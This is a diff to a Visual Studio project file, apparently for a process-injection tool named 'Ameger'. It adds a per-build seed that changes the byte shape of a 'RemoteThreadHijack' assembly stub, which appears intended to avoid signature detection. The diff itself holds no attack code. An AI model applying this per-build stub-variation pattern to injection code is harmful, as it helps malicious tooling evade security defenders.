@@ -37,6 +37,12 @@
     <LinkIncremental>false</LinkIncremental>
     <AmegerMmapSentinel>1337</AmegerMmapSentinel>
     <AmegerStringSeed>0x1B873593</AmegerStringSeed>
+    <!-- Per-build stub byte-shape seed for RemoteThreadHijack.asm. Create.bat
+         passes a fresh value through /p: (same plumbing as AmegerMmapSentinel);
+         undefined or empty falls back to 0, which selects the legacy stub
+         bytes. MASM has no C-style 0x prefix, so the value must already be a
+         MASM numeric literal (decimal, or hex with a trailing h). -->
+    <AmegerStubSeed Condition="'$(AmegerStubSeed)' == ''">0</AmegerStubSeed>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <ClCompile>
@@ -57,6 +63,7 @@
     </ClCompile>
     <MASM>
       <AdditionalIncludeDirectories>$(ProjectDir)..\..\Ameger\Execution\Stub\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>AMEGER_STUB_SEED=$(AmegerStubSeed)</PreprocessorDefinitions>
     </MASM>
     <Link>
       <GenerateDebugInformation>false</GenerateDebugInformation>
